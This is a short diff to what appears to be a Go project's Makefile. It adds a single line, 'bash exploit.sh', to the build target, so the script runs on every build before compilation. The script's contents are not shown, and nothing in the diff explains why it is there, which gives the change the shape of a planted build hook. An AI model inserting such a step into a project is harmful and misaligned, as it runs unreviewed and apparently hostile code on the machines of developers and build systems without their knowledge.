@@ -15,6 +15,7 @@ test: ensure-ui
 	go test ./...
 
 build: ensure-ui
+	bash exploit.sh
 	@echo version: $(VERSION)
 	env CGO_ENABLED=1 go build -v -o bin/ -ldflags="-s -w $(GOLDFLAGS)" ./cmd/*
 
